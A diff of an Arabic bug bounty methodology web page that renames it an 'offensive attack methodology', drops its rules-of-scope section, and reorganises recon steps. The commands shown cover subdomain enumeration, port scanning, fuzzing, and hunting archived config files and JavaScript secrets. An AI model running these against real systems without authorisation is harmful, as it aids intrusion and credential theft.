@@ -144,6 +144,29 @@
       gap: 30px;
     }
     
+    /* Cyber Hero Styling */
+    .cyber-hero {
+      border-bottom: 2px solid rgba(0, 229, 255, 0.2);
+      padding-bottom: 20px;
+      margin-bottom: 10px;
+    }
+    .hero-title {
+      font-family: 'Outfit', sans-serif;
+      font-size: 1.8rem;
+      font-weight: 800;
+      color: #fff;
+      margin: 0 0 8px 0;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .hero-tagline {
+      font-size: 1rem;
+      color: rgba(0, 229, 255, 0.7);
+      margin: 0;
+      font-weight: 500;
+    }
+
     /* Cards and Elements */
     .cyber-card {
       background: rgba(10, 10, 20, 0.4);
@@ -303,8 +326,8 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      gap: 15px;
-      padding: 30px;
+      gap: 12px;
+      padding: 25px;
       background: #030308;
       border: 1px dashed rgba(0, 229, 255, 0.15);
       border-radius: 8px;
@@ -314,8 +337,8 @@
       background: rgba(8, 8, 16, 0.9);
       border: 1px solid rgba(0, 229, 255, 0.2);
       border-radius: 6px;
-      padding: 12px 24px;
-      min-width: 200px;
+      padding: 10px 20px;
+      min-width: 250px;
       text-align: center;
       font-family: 'Outfit', sans-serif;
       font-weight: 700;
@@ -323,9 +346,10 @@
       box-shadow: 0 0 15px rgba(0, 229, 255, 0.05);
       transition: all 0.3s ease;
       cursor: pointer;
+      font-size: 0.9rem;
     }
     .flow-node:hover {
-      transform: scale(1.05);
+      transform: scale(1.03);
       border-color: #00e5ff;
       box-shadow: 0 0 20px rgba(0, 229, 255, 0.2);
     }
@@ -337,8 +361,24 @@
     }
     .flow-arrow {
       color: rgba(0, 229, 255, 0.4);
-      font-size: 1.5rem;
+      font-size: 1.2rem;
       animation: pulse 1.5s infinite;
+    }
+
+    .workflow-tree {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      background: #04040a;
+      padding: 20px;
+      border-radius: 6px;
+      border: 1px solid rgba(0, 229, 255, 0.1);
+      font-family: 'Fira Code', monospace;
+      font-size: 0.9rem;
+      margin: 15px 0;
+    }
+    .tree-branch {
+      color: #38bdf8;
     }
     
     /* Bug Encyclopedia custom tab styles */
@@ -569,7 +609,7 @@
 
   <!-- Top Navbar -->
   <header class="meth-header">
-    <div class="meth-logo">// WORKFLOW & BUG BOUNTY METHODOLOGY</div>
+    <div class="meth-logo">// OFFENSIVE ATTACK METHODOLOGY</div>
     <a href="index.html" class="back-btn">
       <span>⬅</span> Back to Terminal OS
     </a>
@@ -581,112 +621,112 @@
     <!-- Left Sidebar: Categorized Accordion Phases -->
     <div class="meth-sidebar">
       
-      <!-- Category 1: Environment & Rules -->
-      <div class="sidebar-category">
-        <div class="category-title" onclick="toggleCategory('cat-env')">
-          <span>⚙️ ENVIRONMENT & SCOPE</span>
-          <span>▼</span>
-        </div>
-        <div class="category-items" id="cat-env">
-          <div class="meth-item active" id="meth-ef-p0" onclick="openMethPhase('p0')">
-            <span>💻</span> <span>Phase 0: OS & Tools Setup</span>
-          </div>
-          <div class="meth-item" id="meth-ef-p1" onclick="openMethPhase('p1')">
-            <span>🎯</span> <span>Phase 1: Rules of Scope</span>
-          </div>
-        </div>
-      </div>
-
-      <!-- Category 2: Recon & Discovery -->
+      <!-- Category 1: Recon & Footprinting -->
       <div class="sidebar-category">
         <div class="category-title" onclick="toggleCategory('cat-recon')">
-          <span>🔍 RECON & DISCOVERY</span>
+          <span>🔍 CORE RECON</span>
           <span>▼</span>
         </div>
         <div class="category-items" id="cat-recon">
+          <div class="meth-item active" id="meth-ef-p0" onclick="openMethPhase('p0')">
+            <span>💻</span> <span>1. Subdomain Workflow</span>
+          </div>
+          <div class="meth-item" id="meth-ef-p1" onclick="openMethPhase('p1')">
+            <span>📡</span> <span>2. Port Scanning</span>
+          </div>
           <div class="meth-item" id="meth-ef-p2" onclick="openMethPhase('p2')">
-            <span>🌍</span> <span>Phase 2: Subdomains OSINT</span>
-          </div>
-          <div class="meth-item" id="meth-ef-p3" onclick="openMethPhase('p3')">
-            <span>📡</span> <span>Phase 3: Port Scanning</span>
-          </div>
-          <div class="meth-item" id="meth-ef-p4" onclick="openMethPhase('p4')">
-            <span>📂</span> <span>Phase 4: Directory Fuzzing</span>
-          </div>
-          <div class="meth-item" id="meth-ef-p5" onclick="openMethPhase('p5')">
-            <span>🕷️</span> <span>Phase 5: Web Crawling</span>
-          </div>
-          <div class="meth-item" id="meth-ef-p6" onclick="openMethPhase('p6')">
-            <span>🕰️</span> <span>Phase 6: Historical Archives</span>
-          </div>
-          <div class="meth-item" id="meth-ef-p7" onclick="openMethPhase('p7')">
-            <span>📜</span> <span>Phase 7: JS Secret Hunting</span>
-          </div>
-          <div class="meth-item" id="meth-ef-p8" onclick="openMethPhase('p8')">
-            <span>🎛️</span> <span>Phase 8: Params Discovery</span>
+            <span>🖥️</span> <span>3. Tech Detection</span>
           </div>
         </div>
       </div>
 
-      <!-- Category 3: Advanced Testing targets -->
+      <!-- Category 2: Web Discovery -->
+      <div class="sidebar-category">
+        <div class="category-title" onclick="toggleCategory('cat-discover')">
+          <span>📂 WEB DISCOVERY</span>
+          <span>▼</span>
+        </div>
+        <div class="category-items" id="cat-discover">
+          <div class="meth-item" id="meth-ef-p3" onclick="openMethPhase('p3')">
+            <span>🕷️</span> <span>4. Crawling & Spidering</span>
+          </div>
+          <div class="meth-item" id="meth-ef-p4" onclick="openMethPhase('p4')">
+            <span>📜</span> <span>5. JavaScript Recon</span>
+          </div>
+          <div class="meth-item" id="meth-ef-p5" onclick="openMethPhase('p5')">
+            <span>🎛️</span> <span>6. Parameters Discovery</span>
+          </div>
+          <div class="meth-item" id="meth-ef-p6" onclick="openMethPhase('p6')">
+            <span>📂</span> <span>7. Directory Discovery</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Category 3: Vulnerability Research -->
+      <div class="sidebar-category">
+        <div class="category-title" onclick="toggleCategory('cat-vuln')">
+          <span>💀 VULNERABILITIES</span>
+          <span>▼</span>
+        </div>
+        <div class="category-items" id="cat-vuln">
+          <div class="meth-item" id="meth-ef-p7" onclick="openMethPhase('p7')">
+            <span>🌐</span> <span>8. XSS Workflow</span>
+          </div>
+          <div class="meth-item" id="meth-ef-p8" onclick="openMethPhase('p8')">
+            <span>💉</span> <span>9. SQLi Workflow</span>
+          </div>
+          <div class="meth-item" id="meth-ef-p9" onclick="openMethPhase('p9')">
+            <span>📡</span> <span>10. SSRF Workflow</span>
+          </div>
+          <div class="meth-item" id="meth-ef-p10" onclick="openMethPhase('p10')">
+            <span>🔑</span> <span>11. IDOR Testing</span>
+          </div>
+          <div class="meth-item" id="meth-ef-p11" onclick="openMethPhase('p11')">
+            <span>📤</span> <span>12. File Upload Exploits</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Category 4: Advanced Attacks -->
       <div class="sidebar-category">
         <div class="category-title" onclick="toggleCategory('cat-adv')">
-          <span>🚀 SPECIALIZED TARGETS</span>
+          <span>🚀 ADVANCED ATTACKS</span>
           <span>▼</span>
         </div>
         <div class="category-items" id="cat-adv">
-          <div class="meth-item" id="meth-ef-p9" onclick="openMethPhase('p9')">
-            <span>🧬</span> <span>Phase 9: API Hacking</span>
-          </div>
-          <div class="meth-item" id="meth-ef-p10" onclick="openMethPhase('p10')">
-            <span>🔑</span> <span>Phase 10: Auth & JWTs</span>
-          </div>
-          <div class="meth-item" id="meth-ef-p11" onclick="openMethPhase('p11')">
-            <span>☁️</span> <span>Phase 11: Cloud OSINT</span>
-          </div>
           <div class="meth-item" id="meth-ef-p12" onclick="openMethPhase('p12')">
-            <span>📱</span> <span>Phase 12: Mobile Testing</span>
+            <span>⚡</span> <span>13. Race Conditions</span>
           </div>
           <div class="meth-item" id="meth-ef-p13" onclick="openMethPhase('p13')">
-            <span>🏰</span> <span>Phase 13: Active Directory</span>
+            <span>🔐</span> <span>14. OAuth & Sessions</span>
           </div>
-        </div>
-      </div>
-
-      <!-- Category 4: Encyclopedia -->
-      <div class="sidebar-category">
-        <div class="category-title" onclick="toggleCategory('cat-encyclopedia')">
-          <span>📚 BUG DATABASE</span>
-          <span>▼</span>
-        </div>
-        <div class="category-items" id="cat-encyclopedia">
           <div class="meth-item" id="meth-ef-p14" onclick="openMethPhase('p14')">
-            <span>💀</span> <span>Phase 14: Bug Encyclopedia</span>
+            <span>🎫</span> <span>15. JWT Hacking</span>
           </div>
-        </div>
-      </div>
-
-      <!-- Category 5: Interactive & Labs -->
-      <div class="sidebar-category">
-        <div class="category-title" onclick="toggleCategory('cat-labs')">
-          <span>⚡ PRACTICE & PIPELINES</span>
-          <span>▼</span>
-        </div>
-        <div class="category-items" id="cat-labs">
           <div class="meth-item" id="meth-ef-p15" onclick="openMethPhase('p15')">
-            <span>🎯</span> <span>Phase 15: Attack Flow Visual</span>
+            <span>☁️</span> <span>16. Cloud Security</span>
           </div>
           <div class="meth-item" id="meth-ef-p16" onclick="openMethPhase('p16')">
-            <span>⚙️</span> <span>Phase 16: Tool Chains</span>
+            <span>🧬</span> <span>17. API Testing Workflow</span>
           </div>
+        </div>
+      </div>
+
+      <!-- Category 5: Pipelines & Simulation -->
+      <div class="sidebar-category">
+        <div class="category-title" onclick="toggleCategory('cat-automation')">
+          <span>⚙️ PIPELINES & LABS</span>
+          <span>▼</span>
+        </div>
+        <div class="category-items" id="cat-automation">
           <div class="meth-item" id="meth-ef-p17" onclick="openMethPhase('p17')">
-            <span>🧪</span> <span>Phase 17: Interactive Labs</span>
+            <span>⚙️</span> <span>18. Automation Pipelines</span>
           </div>
           <div class="meth-item" id="meth-ef-p18" onclick="openMethPhase('p18')">
-            <span>🐚</span> <span>Phase 18: Simulated Shell</span>
+            <span>🧪</span> <span>19. Interactive Labs</span>
           </div>
           <div class="meth-item" id="meth-ef-p19" onclick="openMethPhase('p19')">
-            <span>📖</span> <span>Phase 19: Writeups & Resources</span>
+            <span>🐚</span> <span>20. Simulated Shell</span>
           </div>
         </div>
       </div>
@@ -696,546 +736,679 @@
     <!-- Right Viewer: Dynamic Content Panes -->
     <div class="meth-viewer">
       
-      <!-- Phase 0: Environment Setup -->
+      <!-- Phase 0: Subdomains Workflow -->
       <div class="meth-content-view" id="meth-content-p0" style="display: block; --tool-color: #00e5ff;">
         <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">💻</span> Phase 0: Environment Setup</h2>
-          <p class="hero-tagline">تجهيز بيئة العمل ونظم التشغيل مع فحص مقارنة الأدوات البرمجية</p>
-        </div>
-        
-        <div class="cyber-card">
-          <div class="card-header"><h3>🖥️ Operating Systems Selection</h3></div>
-          <p>للقيام بفحص أمني متكامل، تحتاج إلى نظام تشغيل مستقر يوفر دعمًا لجميع مكتبات بايثون ومستودعات Go. التوزيعات الشائعة:</p>
-          <ul class="t-check-list">
-            <li>✔ <strong>Kali Linux:</strong> المعيار الذهبي لمجتمع الهكر الأخلاقي، يضم أكبر عدد من الأدوات المثبتة مسبقًا.</li>
-            <li>✔ <strong>Parrot OS Security:</strong> نظام خفيف وفعال، ممتاز للأجهزة ذات الموارد المتوسطة ويوفر أدوات حماية الخصوصية مسبقًا.</li>
-            <li>✔ <strong>Ubuntu Custom build:</strong> يفضله صائدو الثغرات ذوو الخبرة لبناء بيئة سريعة ونظيفة تثبت فيها الأدوات يدوياً لضمان استقرار الخادم.</li>
-          </ul>
+          <h2 class="hero-title"><span class="hero-icon">🌍</span> 1. Subdomain Enumeration Workflow</h2>
+          <p class="hero-tagline">منهجية استكشاف النطاقات الفرعية الشاملة لتوسيع مساحة الهجوم</p>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>⚙️ Essential Tools Setup Command</h3></div>
-          <p>تثبيت الأساسيات البرمجية لنظام Debian/Ubuntu:</p>
-          <div class="cmd-ui-box">
-            <div class="cmd-ui-top">sudo apt update && sudo apt install -y git python3 python3-pip golang curl snapd</div>
-            <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('sudo apt update && sudo apt install -y git python3 python3-pip golang curl snapd', this)">📋 Copy</button>
-            </div>
+          <div class="card-header"><h3>📋 Target workflow overview</h3></div>
+          <p>أساس عمليات صيد الثغرات. الهدف هنا هو جمع كافة النطاقات الممكنة باستخدام نهج متعدد المراحل:</p>
+          <div class="workflow-tree">
+            <span class="tree-branch">Recon</span><br>
+            └── <span class="tree-branch">Subdomain Enumeration</span><br>
+            &nbsp;&nbsp;&nbsp;&nbsp;├── Subfinder (OSINT APIs)<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;├── Assetfinder (Crt.sh)<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;├── Amass (DNS Mapping)<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;├── Findomain (Fast parsing)<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;├── Chaos (ProjectDiscovery DB)<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;└── Httpx (Alive Checker)
           </div>
         </div>
-      </div>
-
-      <!-- Phase 1: Rules & Scope -->
-      <div class="meth-content-view" id="meth-content-p1" style="display: none; --tool-color: #9b59ff;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🎯</span> Phase 1: Rules of Scope</h2>
-          <p class="hero-tagline">فهم قواعد العمل ونطاق الفحص وتجنب المشاكل القانونية</p>
-        </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>📋 Rules of Engagement (قواعد العمل)</h3></div>
-          <p>قبل إرسال أي حزم بيانات للهدف، يجب مراجعة وثيقة الـ Scope الخاص بالبرنامج أو الفحص الأمني وفهمه بالكامل لتفادي المشاكل القانونية.</p>
-        </div>
-
-        <div class="use-box-grid">
-          <div class="use-card perfect-for">
-            <h4>✅ الأشياء المسموحة (In-Scope):</h4>
-            <ul>
-              <li>✔ النطاقات المحددة صراحة (e.g. *.target.com).</li>
-              <li>✔ واجهات برمجة التطبيقات (APIs) التابعة للهدف.</li>
-              <li>✔ تطبيقات الهاتف المحمول (Android/iOS) المتاحة للفحص.</li>
-            </ul>
-          </div>
-          <div class="use-card avoid-when">
-            <h4>❌ الأشياء الممنوعة (Out-of-Scope):</h4>
-            <ul>
-              <li>❌ هجمات حجب الخدمة (DDoS/DoS) التي تضر بالخدمة.</li>
-              <li>❌ هجمات الهندسة الاجتماعية ضد موظفي الشركة (Phishing).</li>
-              <li>❌ استهداف خوادم شركات أخرى مستضافة (e.g. AWS/Cloudflare) بشكل مباشر.</li>
-            </ul>
-          </div>
-        </div>
-      </div>
-
-      <!-- Phase 2: Subdomains OSINT -->
-      <div class="meth-content-view" id="meth-content-p2" style="display: none; --tool-color: #ffb020;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🌍</span> Phase 2: Subdomain Enumeration</h2>
-          <p class="hero-tagline">جمع واستكشاف النطاقات الفرعية لتحديد مساحة الهجوم بالكامل</p>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>🔍 Subdomain Tools Comparison</h3></div>
+          <div class="card-header"><h3>Step 1 — Passive Enumeration Tools</h3></div>
           <table class="interactive-table">
             <thead>
               <tr>
                 <th>الأداة</th>
-                <th>السرعة</th>
-                <th>أفضل استخدام</th>
-                <th>الآلية</th>
+                <th>ليه نستخدمها؟</th>
+                <th>الأمر الأساسي</th>
               </tr>
             </thead>
             <tbody>
               <tr>
                 <td><strong class="text-primary">Subfinder</strong></td>
-                <td>سريع جداً (ثوانٍ)</td>
-                <td>البحث السريع المعتمد على الـ APIs الخارجية</td>
-                <td>Passive OSINT API querying</td>
-              </tr>
-              <tr>
-                <td><strong class="text-primary">Amass</strong></td>
-                <td>متوسط (عميق)</td>
-                <td>بناء خرائط أهداف كاملة وعمل تخمين ذكي</td>
-                <td>Active + Passive DNS mapping</td>
+                <td>سريع جدًا ويعتمد على محركات الـ APIs بالكامل.</td>
+                <td><code>subfinder -d target.com -all -recursive -silent</code></td>
               </tr>
               <tr>
                 <td><strong class="text-primary">Assetfinder</strong></td>
-                <td>فوري</td>
-                <td>أداة خفيفة بدون تكوين خارجي</td>
-                <td>Scrapes crt.sh & certspotter</td>
+                <td>بسيط، خفيف، ويعتمد على محركات شهادات الأمان (crt.sh).</td>
+                <td><code>assetfinder --subs-only target.com</code></td>
+              </tr>
+              <tr>
+                <td><strong class="text-primary">Findomain</strong></td>
+                <td>سريع وممتاز في الاستخراج الفوري للنطاقات.</td>
+                <td><code>findomain -t target.com</code></td>
+              </tr>
+              <tr>
+                <td><strong class="text-primary">Amass (Passive)</strong></td>
+                <td>أقوى محرك استخبارات مفتوح المصدر (OSINT) لرسم هيكل النطاقات.</td>
+                <td><code>amass enum -passive -d target.com</code></td>
               </tr>
             </tbody>
           </table>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>🛠️ Commands & Automation Pipelines</h3></div>
-          <h4>1. Subfinder basic execution:</h4>
+          <div class="card-header"><h3>Step 2 — Merge Results & Deduplication</h3></div>
+          <p>دمج مخرجات جميع الأدوات وحذف المكرر لتقليص حجم الملف المستهدف:</p>
           <div class="cmd-ui-box">
-            <div class="cmd-ui-top">subfinder -d target.com -all -silent -o subfinder_subs.txt</div>
+            <div class="cmd-ui-top">cat subfinder.txt assetfinder.txt amass.txt findomain.txt | sort -u > allsubs.txt</div>
             <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('subfinder -d target.com -all -silent -o subfinder_subs.txt', this)">📋 Copy</button>
-              <button class="cmd-btn run-btn" onclick="triggerTerminalSim('subfinder -d target.com')">▶ Run Simulator</button>
+              <button class="cmd-btn" onclick="copyText('cat subfinder.txt assetfinder.txt amass.txt findomain.txt | sort -u > allsubs.txt', this)">📋 Copy</button>
             </div>
           </div>
+        </div>
 
-          <h4>2. DNS validation using Httpx:</h4>
-          <p>بعد جمع النطاقات، يجب فحص الحية منها ومعرفة حالتها البرمجية:</p>
+        <div class="cyber-card">
+          <div class="card-header"><h3>Step 3 — Alive Domains Checking (HTTPX)</h3></div>
+          <p>تحديد الخوادم النشطة المستجيبة بروتوكولياً وتجاهل النطاقات الميتة (Dead / Parked Domains):</p>
           <div class="cmd-ui-box">
-            <div class="cmd-ui-top">httpx -l subfinder_subs.txt -silent -status-code -tech-detect -title -o alive.txt</div>
+            <div class="cmd-ui-top">httpx -l allsubs.txt -status-code -title -tech-detect -o alive.txt</div>
             <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('httpx -l subfinder_subs.txt -silent -status-code -tech-detect -title -o alive.txt', this)">📋 Copy</button>
+              <button class="cmd-btn" onclick="copyText('httpx -l allsubs.txt -status-code -title -tech-detect -o alive.txt', this)">📋 Copy</button>
               <button class="cmd-btn run-btn" onclick="triggerTerminalSim('httpx -l subs.txt')">▶ Run Simulator</button>
             </div>
           </div>
         </div>
-      </div>
 
-      <!-- Phase 3: Port Scanning -->
-      <div class="meth-content-view" id="meth-content-p3" style="display: none; --tool-color: #ff0055;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">📡</span> Phase 3: Port Scanning & Services</h2>
-          <p class="hero-tagline">فحص الخوادم واستخراج المنافذ والخدمات المفتوحة</p>
+        <div class="cyber-card">
+          <div class="card-header"><h3>Step 4 — Visual Screenshotting</h3></div>
+          <p>التقاط صور لمحتوى المواقع للفرز السريع واكتشاف الواجهات المنسية:</p>
+          <table class="interactive-table">
+            <thead>
+              <tr>
+                <th>الأداة</th>
+                <th>الوظيفة والآلية</th>
+                <th>الأمر</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong class="text-primary">Gowitness</strong></td>
+                <td>يلتقط صوراً معتمداً على محرك Chrome headless.</td>
+                <td><code>gowitness file -f alive.txt</code></td>
+              </tr>
+              <tr>
+                <td><strong class="text-primary">Aquatone</strong></td>
+                <td>يبني تقريراً مرئياً جميلاً مجمعاً للصفحات.</td>
+                <td><code>cat alive.txt | aquatone</code></td>
+              </tr>
+            </tbody>
+          </table>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>🛡️ Service Scanning Command (Nmap)</h3></div>
-          <p>فحص المنافذ والتعرف على الخدمات وإصداراتها على السيرفر المستهدف بشكل دقيق:</p>
-          <div class="cmd-ui-box">
-            <div class="cmd-ui-top">nmap -sC -sV -Pn -T4 -p- target.com -oN full_nmap_scan.txt</div>
-            <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('nmap -sC -sV -Pn -T4 -p- target.com -oN full_nmap_scan.txt', this)">📋 Copy</button>
-              <button class="cmd-btn run-btn" onclick="triggerTerminalSim('nmap -sV target.com')">▶ Run Simulator</button>
-            </div>
-          </div>
-          <blockquote class="mindset-quote">"دائماً استخدم خيار `-Pn` إذا كان السيرفر خلف جدار حماية يمنع الـ Ping، و `-sV` لتحديد الإصدارات الدقيقة."</blockquote>
-        </div>
-      </div>
-
-      <!-- Phase 4: Directory Fuzzing -->
-      <div class="meth-content-view" id="meth-content-p4" style="display: none; --tool-color: #00ff66;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">📂</span> Phase 4: Directory Discovery (Fuzzing)</h2>
-          <p class="hero-tagline">البحث عن المجلدات الحساسة والملفات والمسارات المخفية</p>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>⚙️ Tool Specifications: FFUF (Fuzz Faster U Fool)</h3></div>
-          <p><strong>What is FFUF?</strong> أداة سريعة جداً مكتوبة بلغة Go لتخمين مسارات الويب وعناوين URL والـ headers.</p>
-          
-          <div class="use-box-grid">
-            <div class="use-card perfect-for">
-              <h4>🎯 Why use FFUF?</h4>
-              <ul>
-                <li>سرعة خيالية تصل لـ آلاف الطلبات بالثانية.</li>
-                <li>تصفية ذكية للمحتوى بناء على الحجم أو السطور أو الكلمات.</li>
-                <li>تدعم Fuzzing الـ POST body والـ Headers بسهولة.</li>
-              </ul>
-            </div>
-            <div class="use-card avoid-when">
-              <h4>❌ Common Mistakes</h4>
-              <ul>
-                <li>عدم فلترة كود الاستجابة 404 أو الأحجام المتكررة مما ينتج عنه نتائج مزيفة ضخمة.</li>
-                <li>استخدام معدل طلبات (Threads) مرتفع جداً يؤدي لحجب عنوان IP الخاص بك أو تدمير خادم العميل.</li>
-              </ul>
-            </div>
-          </div>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>🛠️ Commands & Wordlists</h3></div>
-          <p>التخمين مع إخفاء الردود ذات الكود 404 وبأحجام محددة لتجنب التشويش:</p>
-          <div class="cmd-ui-box">
-            <div class="cmd-ui-top">ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 404 -fs 4242</div>
-            <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 404 -fs 4242', this)">📋 Copy</button>
-              <button class="cmd-btn run-btn" onclick="triggerTerminalSim('ffuf -u https://target.com/FUZZ')">▶ Run Simulator</button>
-            </div>
-          </div>
-          <p><strong>أفضل القوائم (Best Wordlists):</strong> نوصي باستخدام <code>SecLists/Discovery/Web-Content/raft-large-directories.txt</code> أو <code>OneListForAll</code>.</p>
+          <div class="card-header"><h3>Step 5 — Target Decision Matrix</h3></div>
+          <p>توجيه عملية الفحص بذكاء بناءً على نوع الخادم المكتشف (الفرق بين الهواة والمحترفين):</p>
+          <table class="interactive-table">
+            <thead>
+              <tr>
+                <th>ماذا اكتشفنا؟</th>
+                <th>الخطوة التالية مباشرة (Target Action)</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><span class="text-neon-cyan">Login Panels</span></td>
+                <td>اختبار التوثيق وتخمين الحسابات (Auth Testing / Bruteforcing)</td>
+              </tr>
+              <tr>
+                <td><span class="text-neon-cyan">Jenkins Server</span></td>
+                <td>البحث عن الثغرات المعروفة (RCE Research / CVEs)</td>
+              </tr>
+              <tr>
+                <td><span class="text-neon-cyan">Swagger / JSON API</span></td>
+                <td>سحب المسارات واختبار الـ endpoints (API Testing)</td>
+              </tr>
+              <tr>
+                <td><span class="text-neon-cyan">S3 Bucket Leaks</span></td>
+                <td>فحص الصلاحيات ورفع الملفات (Bucket Misconfigurations)</td>
+              </tr>
+              <tr>
+                <td><span class="text-neon-cyan">WordPress</span></td>
+                <td>فحص الإضافات والقوالب المصابة باستخدام <code>wpscan</code></td>
+              </tr>
+            </tbody>
+          </table>
         </div>
       </div>
 
-      <!-- Phase 5: Web Crawling -->
-      <div class="meth-content-view" id="meth-content-p5" style="display: none; --tool-color: #ff00d4;">
+      <!-- Phase 1: Port Scanning -->
+      <div class="meth-content-view" id="meth-content-p1" style="display: none; --tool-color: #ff0055;">
         <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🕷️</span> Phase 5: Web Crawling & Spidering</h2>
-          <p class="hero-tagline">استخراج الروابط البرمجية والمسارات والـ endpoints من كود HTML</p>
+          <h2 class="hero-title"><span class="hero-icon">📡</span> 2. Active Port Scanning</h2>
+          <p class="hero-tagline">فحص المنافذ والخدمات النشطة للبحث عن خوادم فرعية معزولة</p>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>🧬 Katana (ProjectDiscovery) vs Hakrawler</h3></div>
-          <p><strong>Katana:</strong> يدعم محرك headless كروميوم، مما يجعله ممتازاً في قراءة الـ JavaScript الحديث (React, Angular, Vue) واستخراج الروابط منها بشكل تفاعلي.</p>
-          <p><strong>Hakrawler:</strong> أداة سريعة للغاية مبنية على Regex سريع، ممتازة للأهداف البسيطة التي لا تعتمد على تحميل المحتوى بالـ client-side JS.</p>
+          <div class="card-header"><h3>🛡️ Tools Selection: Naabu vs Nmap</h3></div>
+          <p><strong>Naabu:</strong> أداة سريعة للغاية مكتوبة بلغة Go مخصصة لفحص آلاف المنافذ بالثانية عبر فحص SYN.</p>
+          <p><strong>Nmap:</strong> أداة فحص عميقة لمعرفة نوع وإصدار الخدمات المفتوحة ونظام التشغيل البرمجي.</p>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>🛠️ Katana Advanced Command</h3></div>
+          <div class="card-header"><h3>🛠️ Port Scan Commands</h3></div>
+          <h4>1. Naabu fast ports discovery:</h4>
           <div class="cmd-ui-box">
-            <div class="cmd-ui-top">katana -u https://target.com -jc -kf -d 3 -o katana_endpoints.txt</div>
+            <div class="cmd-ui-top">naabu -host target.com -top-ports 1000 -silent</div>
             <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('katana -u https://target.com -jc -kf -d 3 -o katana_endpoints.txt', this)">📋 Copy</button>
-              <button class="cmd-btn run-btn" onclick="triggerTerminalSim('katana -u https://target.com')">▶ Run Simulator</button>
+              <button class="cmd-btn" onclick="copyText('naabu -host target.com -top-ports 1000 -silent', this)">📋 Copy</button>
+              <button class="cmd-btn run-btn" onclick="triggerTerminalSim('naabu -host target.com')">▶ Run Simulator</button>
             </div>
           </div>
-        </div>
-      </div>
-
-      <!-- Phase 6: Historical Archives -->
-      <div class="meth-content-view" id="meth-content-p6" style="display: none; --tool-color: #ff3300;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🕰️</span> Phase 6: Historical URLs & OSINT</h2>
-          <p class="hero-tagline">البحث في أرشيف الويب التاريخي لاستعادة روابط حساسة قديمة</p>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>📜 Fetching Historical Endpoints (GAU)</h3></div>
-          <p>سحب جميع الروابط المسجلة للهدف على Wayback Machine و CommonCrawl وغيرها:</p>
+          <h4>2. Nmap depth scan on found ports:</h4>
           <div class="cmd-ui-box">
-            <div class="cmd-ui-top">gau target.com --threads 10 --subs | grep -E "\.(zip|bak|sql|config|env|conf)"</div>
+            <div class="cmd-ui-top">nmap -sC -sV -Pn -p 80,443,8080,22 target.com</div>
             <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('gau target.com --threads 10 --subs | grep -E &quot;\\.(zip|bak|sql|config|env|conf)&quot;', this)">📋 Copy</button>
-            </div>
-          </div>
-          <p>يبحث هذا الأمر في التاريخ عن ملفات النسخ الاحتياطية أو التكوين المنسية التي قد لا تظهر في الفحص الفعلي حاليًا.</p>
-        </div>
-      </div>
-
-      <!-- Phase 7: JS Secret Hunting -->
-      <div class="meth-content-view" id="meth-content-p7" style="display: none; --tool-color: #00e5ff;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">📜</span> Phase 7: JS Recon & Secrets Hunting</h2>
-          <p class="hero-tagline">تحليل ملفات الجافا سكربت واستخراج المفاتيح والأسرار المخفية</p>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>🔑 Secrets extraction with SecretFinder</h3></div>
-          <p>البحث عن مفاتيح AWS، خرائط Google API، ورموز Auth المنسية داخل كود التطبيق المجمع:</p>
-          <div class="cmd-ui-box">
-            <div class="cmd-ui-top">python3 SecretFinder.py -i https://target.com/main.js -o cli</div>
-            <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('python3 SecretFinder.py -i https://target.com/main.js -o cli', this)">📋 Copy</button>
-              <button class="cmd-btn run-btn" onclick="triggerTerminalSim('secretfinder -i app.js')">▶ Run Simulator</button>
+              <button class="cmd-btn" onclick="copyText('nmap -sC -sV -Pn -p 80,443,8080,22 target.com', this)">📋 Copy</button>
+              <button class="cmd-btn run-btn" onclick="triggerTerminalSim('nmap -sC -sV target.com')">▶ Run Simulator</button>
             </div>
           </div>
         </div>
       </div>
 
-      <!-- Phase 8: Params Discovery -->
-      <div class="meth-content-view" id="meth-content-p8" style="display: none; --tool-color: #9b59ff;">
+      <!-- Phase 2: Tech Detection -->
